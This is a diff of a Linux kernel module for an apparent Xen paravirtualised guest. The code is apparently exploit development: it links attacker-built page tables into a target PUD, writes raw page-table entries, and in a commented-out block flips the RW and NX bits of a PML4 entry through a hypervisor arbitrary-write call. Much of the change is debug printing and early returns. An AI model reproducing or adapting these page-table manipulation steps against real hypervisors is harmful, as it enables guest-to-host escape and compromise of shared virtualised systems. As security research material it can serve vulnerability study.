@@ -99,21 +99,6 @@ void page_walk(unsigned long va)
 	printk("PTE (%p - 0x%lx) val = 0x%lx, offset = 0x%lx \t(flags = %s %s)\n", pte, __machine_addr(pte), *(unsigned long*) pte, pte_index(va), (pte_present(*pte)) ? "P" : "", (pte_write(*pte)) ? "RW" : "");
 }
 
-void semi_page_walk(unsigned long va)
-{
-	pgd_t *pgd;
-	pud_t *pud;
-	pmd_t *pmd;
-	struct mm_struct *mm = current->mm;
-
-	pgd = pgd_offset(mm, va);
-	pud = pud_offset(pgd, va);
-	pmd = pmd_offset(pud, va);
-	printk("PGD (%p - 0x%lx) val = 0x%lx, offset = 0x%lx \t(flags = %s)\n", pgd, __machine_addr(pgd), *(unsigned long*) pgd, pgd_index(va), (pgd_present(*pgd)) ? "P" : "");
-	printk("PUD (%p - 0x%lx) val = 0x%lx, offset = 0x%lx \t(flags = %s)\n", pud, __machine_addr(pud), *(unsigned long*) pud, pud_index(va), (pud_present(*pud)) ? "P" : "");
-	printk("PMD (%p - 0x%lx) val = 0x%lx, offset = 0x%lx \t(flags = %s %s)\n", pmd, __machine_addr(pmd), *(unsigned long*) pmd, pmd_index(va), (pmd_present(*pmd)) ? "P" : "", (pmd_large(*pmd)) ? "PSE" : "");
-}
-
 
 
 unsigned long read_idt_addr(void) {
@@ -128,7 +113,6 @@ static int init_test(void) {
   long scp_res;
   unsigned long hc_ret;
 
-  u64 *my_pt = (void*)__get_free_pages(GFP_KERNEL, 0);
 
   slow_print("call_int_85 at 0x%p\n", call_int_85);
   slow_print("backstop_85_handler at 0x%p\n", backstop_85_handler);
@@ -474,9 +458,13 @@ void mem_test(void)
         ((u64*)(MY_SECOND_AREA+0x3000))[2] = 0;*/
     }
 }
+
+
 static void cleanup_test(void) {
   u64 *scratch_pt_entry;
   u8 *scratch_vaddr;
+  unsigned long new_value;
+  pgd_t *m2a_pgd;
   
   pgd_t *user_pgd = pgd_offset(current->mm, 0x0000600040000000);
   pud_t *user_pud = pud_offset(user_pgd, 0x0000600040000000);
@@ -505,12 +493,19 @@ static void cleanup_test(void) {
   page_walk((unsigned long) current->mm->pgd);
   slow_print("Page Walk of MY_SECOND_AREA\n");
   page_walk(MY_SECOND_AREA);
-  slow_print("Page Walk from the pdf_offset of MY_SECOND_AREA\n");
   slow_print("PML4 SECOND entry: 0x%lx\n", (unsigned long)pgd_val(*pgd_offset(current->mm, MY_SECOND_AREA)));
-  slow_print("PML4 SECOND entry: machine address 0x%lx\n", (unsigned long) virt_to_machine((unsigned long)pgd_val(*pgd_offset(current->mm, MY_SECOND_AREA))).maddr);
+  //m2a_pgd = pgd_offset(current->mm, MY_SECOND_AREA);
+  //slow_print("PML4 SECOND entry: 0x%lx\n", (unsigned long)pgd_val(*m2a_pgd));
+  //slow_print("m2a_pgd value = 0x%lx\n",*(unsigned long *) m2a_pgd);
+  //slow_print("m2a_pgd physical address = 0x%lx\n", __machine_addr(m2a_pgd));
+  // We are adding the RW and removing the NX bit
+  //new_value = (( *(unsigned long *) m2a_pgd ) | (_PAGE_RW)) & ~_PAGE_NX;
+  //slow_print("m2a_pgd value = 0x%lx\n",new_value);
+  //HYPERVISOR_arbitrary_access(__machine_addr(m2a_pgd),&new_value, sizeof(new_value), ARBITRARY_WRITE);
+  page_walk(MY_SECOND_AREA);
+  slow_print("PML4 SECOND entry: 0x%lx\n", (unsigned long)pgd_val(*pgd_offset(current->mm, MY_SECOND_AREA)));
   slow_print("PML4 THIRD entry: 0x%lx\n", (unsigned long)pgd_val(*pgd_offset(current->mm, MY_THIRD_AREA)));
   slow_print("PML4 entry for my_pt: 0x%lx\n", (unsigned long)pgd_val(*pgd_offset(current->mm, (unsigned long) my_pt)));
-  return;
 
 
   /* link my_pt in my_pmd */
@@ -520,8 +515,6 @@ static void cleanup_test(void) {
   slow_print("page walk of my_pmd\n");
   page_walk((unsigned long) my_pmd);
 
-  
-  return;
 
   /* map target PUD as entry 0, for writing from the guest */
   my_pt[0] = (0x7 | ((unsigned long) /*pgd_val*/(*pgd_offset(current->mm, MY_SECOND_AREA)).pgd & PTE_PFN_MASK));
@@ -545,8 +538,8 @@ static void cleanup_test(void) {
    */
 
   /* set up temporary mapping through a guest userspace address */
-  //slow_print("Printing the mapping before  0x0000600040000000");
-  //page_walk(0x0000600040000000);
+  slow_print("Printing the mapping before  0x0000600040000000");
+  page_walk(0x0000600040000000);
   set_pud_entry(user_pud, virt_to_machine(my_pmd).maddr);
   slow_print("Printing the mapping after 0x0000600040000000\n");
   page_walk(0x0000600040000000);
@@ -561,16 +554,26 @@ static void cleanup_test(void) {
 
   barrier();
   slow_print("linked PMD into target PUD\n");
+  page_walk(0x0000600040000000);
 
   /* remove the mapping in guest userspace, together with garbage behind it */
   slow_print("going to unlink mapping via userspace PUD\n");
   //slow_print("forcing quit");
-  //return;
   slow_print("((u64*)(MY_SECOND_AREA+0x3000)) : %p\n",((u64*)(MY_SECOND_AREA+0x3000)));
+  slow_print("pa ((u64*)(MY_SECOND_AREA+0x3000)) : 0x%lx\n",__machine_addr(((u64*)(MY_SECOND_AREA+0x3000))));
+  return;
+  slow_print("((u64*)(MY_SECOND_AREA+0x3000))[1] : %p\n",(void *)((u64*)(MY_SECOND_AREA+0x3000))[1]);
+  slow_print("((u64*)(MY_SECOND_AREA+0x3000))[2] : %p\n",(void *)((u64*)(MY_SECOND_AREA+0x3000))[2]);
+  slow_print("pa ((u64*)(MY_SECOND_AREA+0x3000))[1] : 0x%lx\n",__machine_addr((void *)((u64*)(MY_SECOND_AREA+0x3000))[1]));
+  slow_print("pa ((u64*)(MY_SECOND_AREA+0x3000))[2] : 0x%lx\n",__machine_addr((void *)((u64*)(MY_SECOND_AREA+0x3000))[2]));
+  page_walk((unsigned long) ((u64*)(MY_SECOND_AREA+0x3000))[1]);
+  return;
   ((u64*)(MY_SECOND_AREA+0x3000))[1] = 0;
   ((u64*)(MY_SECOND_AREA+0x3000))[2] = 0;
   slow_print("mapping unlink done\n");
   barrier();
+  
+  return;
 
   /* we have 256 pt entries reserved for scratch allocs */
   scratch_pt_entry = my_pt + 256;
